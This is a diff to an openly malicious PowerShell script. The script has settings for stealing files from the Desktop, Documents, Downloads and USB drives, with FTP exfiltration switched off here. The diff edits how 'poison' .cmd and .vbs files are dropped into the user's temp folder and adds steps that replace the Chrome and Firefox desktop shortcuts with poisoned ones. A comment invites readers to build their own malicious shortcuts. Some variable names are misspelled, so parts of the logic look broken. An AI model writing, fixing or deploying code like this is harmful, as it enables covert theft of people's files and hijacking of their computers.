@@ -11,7 +11,7 @@ $shortcut_privesc='no'
 # File Stealing Section:
 $steal_files_enabled='yes'
 $steal_files_usb='yes'
-$steal_files_ftp='yes'
+$steal_files_ftp='no'
 $steal_desktop_folder='yes'
 $steal_documents_folder='yes'
 $steal_downloads_folder='yes'
@@ -51,14 +51,11 @@ If ($steal_files_usb -eq 'yes') {
 # Note: if you want to add your own shortcuts, just build your own malicious shortcut as shown in the youtube video in the readme and another block of code like below but with your shortcut.
 
 If ($invisible_shell_launcher -eq 'yes') {
-  $poison_file_a="$PSScriptRoot\f o.cmd"
   $poison_file_i="$PSScriptRoot\i.vbs"
   $poison_file_z="$PSScriptRoot\z.cmd"
   mkdir "$Env:UserProfile\temp\"
-  $p_file_a_target="$Env:UserProfile\temp\f o.cmd"
   $p_file_i_target="$Env:UserProfile\temp\i.vbs"
   $p_file_z_target="$Env:UserProfile\temp\z.cmd"
-  robocopy $poison_file_a $p_file_a_target /S /MT /Z
   robocopy $poison_file_i $p_file_i_target /S /MT /Z
   robocopy $poison_file_z $p_file_z_target /S /MT /Z
 }
@@ -66,6 +63,9 @@ If ($invisible_shell_launcher -eq 'yes') {
 If (Test-Path "$Env:UserProfile\Desktop\Google Chrome.lnk" -eq True  -AND $invisile_shell_launcher -eq 'yes') {
   $chrome_lnk="$Env:UserProfile\Desktop\Google Chrome.lnk"
   $poisoned_chrome="$PSScriptRoot\Google Chrome.lnk"
+  $p_file_gc_target="$Env:UserProfile\temp\gc f o.cmd"
+  $poison_file_gc="$PSScriptRoot\gc f o.cmd"
+  robocopy $poison_file_gc $p_file_gc_target /S /MT /Z
   del "C:\Users\Public\Desktop\Google Chrome.lnk"
   robocopy $poison_chrome $chrome_lnk /S /MT /Z
 }
@@ -73,6 +73,9 @@ If (Test-Path "$Env:UserProfile\Desktop\Google Chrome.lnk" -eq True  -AND $invis
 If (Test-Path "$Env:UserProfile\Desktop\Mozilla Firefox.lnk" -eq True  -AND $invisile_shell_launcher -eq 'yes') {
   $firefox_lnk="$Env:UserProfile\Desktop\Mozilla Firefox.lnk"
   $poisoned_firefox="$PSScriptRoot\Mozilla Firefox.lnk"
+  $p_file_mf_target="$Env:UserProfile\temp\mf f o.cmd"
+  $poison_file_mf="$PSScriptRoot\mf f o.cmd"
+  robocopy $poison_file_mf $p_file_mf_target /S /MT /Z
   del "C:\Users\Public\Desktop\Mozilla Firefox.lnk"
   robocopy $poisoned_firefox $firefox_lnk /S /MT /Z
 }
